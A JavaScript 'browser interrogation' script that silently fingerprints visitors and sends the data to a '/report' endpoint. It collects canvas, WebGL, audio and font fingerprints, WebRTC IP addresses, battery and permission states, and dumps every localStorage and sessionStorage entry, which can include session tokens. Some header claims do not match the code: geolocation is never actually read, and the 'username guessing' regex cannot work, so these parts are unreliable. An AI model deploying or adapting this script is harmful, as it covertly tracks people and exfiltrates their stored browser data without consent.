/*
Features included in this script:
- User Guessing: Attempts to infer a username based on quirks in User-Agent or other data.
- GeoLocation: Collects latitude, longitude, and accuracy of the user's location.
- Permissions: Checks the state of permissions for geolocation, camera, microphone, etc.
- General Information: Gathers User-Agent, platform, vendor, and product details.
- Hardware Concurrency: Retrieves the number of logical processors available to the browser.
- Browser Plugins: Lists installed browser plugins.
- Screen and Display: Retrieves screen resolution, color depth, and pixel ratio.
- Browser Features: Detects capabilities like WebAssembly, Service Workers, etc.
- Storage: Inspects localStorage, sessionStorage, and total/used storage quota.
- WebRTC: Extracts public and private IP addresses via WebRTC.
- Network: Reports connection type, downlink speed, and latency.
- WebGL: Gathers GPU vendor, renderer, version, and supported extensions.
- Canvas Fingerprinting: Generates a unique fingerprint from rendered graphics.
- Fonts: Detects installed system fonts by rendering and measuring text.
- Audio Fingerprinting: Creates a unique audio-based fingerprint.
- Battery: Collects battery status, level, and time estimates.
- Audio Emission: Optionally emits sound based on configuration parameters.
*/

// Audio configuration (modify here)
const audioOptions = {
    enabled: false,       // Enable or disable sound emission
    frequency: 440,       // Frequency of the sound (Hz)
    duration: 5,          // Duration of the sound (seconds)
    type: 'sine',         // Type of waveform ('sine', 'square', etc.)
    volume: 90            // Volume as a percentage (0-100%)
};

(async () => {
    console.log("=== Comprehensive Browser Interrogation Script ===");

    const data = {};

    try {
        // General Information
        data.userAgent = navigator.userAgent;
        data.platform = navigator.platform;
        data.vendor = navigator.vendor;
        data.product = navigator.product;

        // Hardware Concurrency
        const cores = navigator.hardwareConcurrency;
        console.log('Number of CPU Cores:', cores);
        data.hardwareConcurrency = cores;

        // Browser Plugins
        try {
            const plugins = Array.from(navigator.plugins).map(plugin => plugin.name);
            data.plugins = plugins;
            console.log('Browser Plugins:', plugins);
        } catch (error) {
            data.plugins = "Unable to retrieve plugins.";
            console.error("Error retrieving plugins:", error);
        }

        // Screen and Display Information
        data.screenResolution = `${window.screen.width}x${window.screen.height}`;
        data.availScreenResolution = `${window.screen.availWidth}x${window.screen.availHeight}`;
        data.colorDepth = window.screen.colorDepth;
        data.pixelRatio = window.devicePixelRatio;

        // Browser Features
        data.browserFeatures = {
            webAssembly: typeof WebAssembly === 'object',
            serviceWorker: 'serviceWorker' in navigator,
            notifications: 'Notification' in window,
            localStorage: 'localStorage' in window,
            sessionStorage: 'sessionStorage' in window,
            indexedDB: 'indexedDB' in window,
            fileAPI: 'File' in window,
            vibrationAPI: 'vibrate' in navigator,
        };

        // Storage Information
        if (navigator.storage && navigator.storage.estimate) {
            const storage = await navigator.storage.estimate();
            data.storageQuota = storage.quota;
            data.storageUsage = storage.usage;
        }

        // Local and Session Storage
        try {
            data.localStorage = Object.entries(localStorage);
            data.sessionStorage = Object.entries(sessionStorage);
        } catch {
            data.localStorage = "Not Accessible";
            data.sessionStorage = "Not Accessible";
        }

        // WebRTC Public and Local IP Enumeration
        const rtc = new RTCPeerConnection();
        data.webRTCIPs = [];
        rtc.createDataChannel('');
        rtc.onicecandidate = (event) => {
            if (event && event.candidate) {
                const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                if (ipMatch) data.webRTCIPs.push(ipMatch[0]);
            }
        };
        await rtc.createOffer().then((offer) => rtc.setLocalDescription(offer));

        // Network Information
        if (navigator.connection) {
            data.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt,
            };
        }

        // Permissions API
        if (navigator.permissions) {
            const permissions = ["geolocation", "notifications", "camera", "microphone"];
            const permissionStatuses = await Promise.all(
                permissions.map((name) =>
                    navigator.permissions.query({ name }).then((status) => ({
                        name,
                        state: status.state === "denied" ? "Permission Denied" : status.state,
                    }))
                )
            );
            data.permissions = permissionStatuses;
        }

        // Battery Information
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            data.battery = {
                level: `${battery.level * 100}%`,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime,
            };
        }

        // Canvas Fingerprinting
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas Fingerprint Test', 2, 2);
        data.canvasFingerprint = canvas.toDataURL();

        // WebGL Information
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            data.webgl = {
                enabled: true,
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                extensions: gl.getSupportedExtensions(),
            };
        } else {
            data.webgl = { enabled: false };
        }

        // Fonts Detection
        const fontList = ['Arial', 'Verdana', 'Times New Roman', 'Courier New'];
        const fontTest = document.createElement('div');
        fontTest.style.position = 'absolute';
        fontTest.style.left = '-9999px';
        fontTest.style.fontFamily = 'monospace';
        fontTest.innerText = 'fontTest';
        document.body.appendChild(fontTest);

        data.fonts = fontList.filter((font) => {
            fontTest.style.fontFamily = `${font}, monospace`;
            return fontTest.offsetWidth !== 10 || fontTest.offsetHeight !== 14;
        });
        document.body.removeChild(fontTest);

        // Audio Fingerprinting
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const analyser = audioCtx.createAnalyser();
            oscillator.connect(analyser);
            oscillator.start(0);
            const buffer = new Float32Array(analyser.fftSize);
            analyser.getFloatFrequencyData(buffer);
            data.audioFingerprint = buffer.every((v) => v === -Infinity) ? "Audio Unavailable" : buffer.slice(0, 5).join(',');
            oscillator.stop();
        } catch {
            data.audioFingerprint = "Audio Fingerprinting Failed";
        }

        // User Guessing
        data.possibleUsername = (() => {
            const userAgent = navigator.userAgent.toLowerCase();
            const windowsMatch = userAgent.match(/windows nt [0-9.]+; ([a-z0-9]+)\\?/i);
            return windowsMatch ? windowsMatch[1] : "Not Detectable";
        })();

        // Emit Sound (Optional)
        const emitSound = (frequency = 440, duration = 1, type = 'sine', volume = 50) => {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                oscillator.type = type;
                oscillator.frequency.setValueAtTime(frequency, audioCtx.currentTime);

                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                gainNode.gain.setValueAtTime(volume / 100, audioCtx.currentTime);

                oscillator.start();
                oscillator.stop(audioCtx.currentTime + duration);

                data.soundTest = `Played ${type} sound at ${frequency}Hz for ${duration}s at volume ${volume}%.`;
            } catch (err) {
                data.soundTest = `Sound emission failed: ${err.message}`;
            }
        };

        if (audioOptions.enabled) {
            emitSound(audioOptions.frequency, audioOptions.duration, audioOptions.type, audioOptions.volume);
        } else {
            data.soundTest = "Sound emission disabled.";
        }

        console.log("Collected Data:", data);

        // Send data back to the server
        const response = await fetch('/report', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
        });

        if (response.ok) {
            console.log("Data successfully sent to the server.");
        } else {
            console.error("Failed to send data. Server responded with:", response.status);
        }
    } catch (error) {
        console.error("Error during data collection or sending:", error);
    }
})();